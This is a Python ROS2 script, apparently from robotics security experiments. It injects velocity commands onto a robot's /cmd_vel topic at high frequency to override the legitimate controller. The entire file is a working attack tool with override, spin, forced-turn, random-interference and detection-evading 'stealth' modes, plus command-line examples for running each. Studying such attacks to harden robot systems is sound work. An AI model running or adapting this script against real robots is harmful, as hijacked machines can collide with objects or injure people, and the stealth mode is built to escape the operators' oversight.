#!/usr/bin/env python3
# Injection attack script - tries to hijack the robot
# The idea is to publish commands faster than the normal controller
# so our messages fill up the queue and override the legitimate control

import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped
from std_msgs.msg import Header
import argparse
import time
import random


class InjectionAttacker(Node):
    """Malicious node that tries to take over control"""
    
    def __init__(self, node_name='injection_attacker', stealth=False):
        super().__init__(node_name)
        self.stealth = stealth
        # Same topic as the normal controller - that's the whole point
        self.publisher = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        
        if stealth:
            self.get_logger().info(f'Stealth mode: {node_name} (trying to be sneaky)')
        else:
            self.get_logger().warn(f'ATTACK MODE: {node_name} - trying to hijack control!')
    
    def _create_twist_stamped(self, linear_x=0.0, angular_z=0.0):
        """Create TwistStamped message"""
        msg = TwistStamped()
        msg.header = Header()
        msg.header.stamp = self.get_clock().now().to_msg()
        msg.header.frame_id = 'base_link'
        msg.twist.linear.x = float(linear_x)
        msg.twist.angular.z = float(angular_z)
        return msg
    
    def attack_override(self, frequency=50, duration=30, attack_speed=0.5):
        """Spam commands at high frequency to override normal control"""
        self.get_logger().warn(f'Override attack: {frequency} Hz for {duration}s @ {attack_speed} m/s')
        start_time = time.time()
        period = 1.0 / frequency
        
        while time.time() - start_time < duration:
            msg = self._create_twist_stamped(linear_x=attack_speed)
            self.publisher.publish(msg)
            time.sleep(period)
        
        self.stop()
        self.get_logger().warn('Override attack done')
    
    def attack_spin(self, frequency=30, duration=20, angular_speed=2.0):
        """Make the robot spin"""
        self.get_logger().warn(f'Spin attack: {frequency} Hz for {duration}s @ {angular_speed} rad/s')
        start_time = time.time()
        period = 1.0 / frequency
        
        while time.time() - start_time < duration:
            msg = self._create_twist_stamped(angular_z=angular_speed)
            self.publisher.publish(msg)
            time.sleep(period)
        
        self.stop()
        self.get_logger().warn('Spin attack done')
    
    def attack_turn_left(self, frequency=50, duration=15, angular_speed=0.5):
        """Force the robot to turn left by spamming commands"""
        self.get_logger().warn(f'Starting turn-left attack: {frequency} Hz for {duration}s')
        start_time = time.time()
        period = 1.0 / frequency
        
        while time.time() - start_time < duration:
            # Positive angular_z = left turn (counterclockwise)
            msg = self._create_twist_stamped(angular_z=angular_speed)
            self.publisher.publish(msg)
            time.sleep(period)
        
        self.stop()
        self.get_logger().warn('Attack finished')
    
    def attack_interference(self, frequency=40, duration=30):
        """Send random commands to mess things up"""
        self.get_logger().warn(f'Interference attack: {frequency} Hz for {duration}s')
        start_time = time.time()
        period = 1.0 / frequency
        
        while time.time() - start_time < duration:
            # Random commands to confuse the robot
            linear_x = random.uniform(-0.3, 0.5)
            angular_z = random.uniform(-1.0, 1.0)
            msg = self._create_twist_stamped(linear_x=linear_x, angular_z=angular_z)
            self.publisher.publish(msg)
            time.sleep(period)
        
        self.stop()
        self.get_logger().warn('Interference attack done')
    
    def attack_stealth_override(self, frequency=25, duration=30, attack_speed=0.3):
        """Try to be sneaky - lower frequency to avoid detection"""
        self.get_logger().info(f'Stealth attack: {frequency} Hz for {duration}s @ {attack_speed} m/s')
        start_time = time.time()
        period = 1.0 / frequency
        
        while time.time() - start_time < duration:
            msg = self._create_twist_stamped(linear_x=attack_speed)
            self.publisher.publish(msg)
            # Add some randomness to look more natural
            time.sleep(period + random.uniform(-0.01, 0.01))
        
        self.stop()
        self.get_logger().info('Stealth attack done')
    
    def stop(self):
        """Send zero velocity to stop"""
        msg = self._create_twist_stamped()
        self.publisher.publish(msg)
        self.get_logger().info('Stopped')


def main():
    parser = argparse.ArgumentParser(
        description='Injection attack - tries to hijack robot control',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # High-frequency override
  python3 injection_attack.py --attack-type override --frequency 50 --duration 30
  
  # Spin
  python3 injection_attack.py --attack-type spin --frequency 30 --duration 20
  
  # Random interference
  python3 injection_attack.py --attack-type interference --frequency 40 --duration 30
  
  # Stealth (lower frequency)
  python3 injection_attack.py --attack-type stealth --frequency 25 --duration 30
  
  # Turn left (what we use for experiments)
  python3 injection_attack.py --attack-type turn_left --frequency 50 --duration 15
        """
    )
    
    parser.add_argument('--attack-type', type=str, required=True,
                       choices=['override', 'spin', 'interference', 'stealth', 'turn_left'],
                       help='What kind of attack')
    parser.add_argument('--frequency', type=float, default=50.0,
                       help='How often to send commands (Hz) - higher = better chance to override')
    parser.add_argument('--duration', type=float, default=30.0,
                       help='How long to attack (seconds)')
    parser.add_argument('--speed', type=float, default=0.5,
                       help='Speed for override/stealth (m/s)')
    parser.add_argument('--angular-speed', type=float, default=2.0,
                       help='Angular speed for spin/turn attacks (rad/s)')
    parser.add_argument('--node-name', type=str, default='injection_attacker',
                       help='ROS2 node name')
    parser.add_argument('--stealth', action='store_true',
                       help='Try to be sneaky')
    
    args = parser.parse_args()
    
    rclpy.init()
    attacker = InjectionAttacker(node_name=args.node_name, stealth=args.stealth)
    
    try:
        if args.attack_type == 'override':
            attacker.attack_override(frequency=args.frequency, duration=args.duration, attack_speed=args.speed)
        elif args.attack_type == 'spin':
            attacker.attack_spin(frequency=args.frequency, duration=args.duration, angular_speed=args.angular_speed)
        elif args.attack_type == 'interference':
            attacker.attack_interference(frequency=args.frequency, duration=args.duration)
        elif args.attack_type == 'stealth':
            attacker.attack_stealth_override(frequency=args.frequency, duration=args.duration, attack_speed=args.speed)
        elif args.attack_type == 'turn_left':
            attacker.attack_turn_left(frequency=args.frequency, duration=args.duration, angular_speed=args.angular_speed)
        
        time.sleep(0.5)  # Give it a moment
    except KeyboardInterrupt:
        print("\nInterrupted - stopping...")
        attacker.stop()
    finally:
        rclpy.shutdown()


if __name__ == '__main__':
    main()

